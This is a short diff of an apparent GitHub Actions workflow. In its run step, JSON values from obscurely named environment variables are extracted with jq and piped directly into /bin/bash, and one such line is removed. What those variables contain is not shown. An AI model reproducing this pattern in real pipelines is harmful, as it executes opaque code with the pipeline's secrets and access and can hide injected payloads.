@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$uzf47" | jq -r .r197 | /bin/bash
           printf '%s' "$yzp7" | jq -r .gq3 | /bin/bash
-          printf '%s' "$md1886" | jq -r .lmn47 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
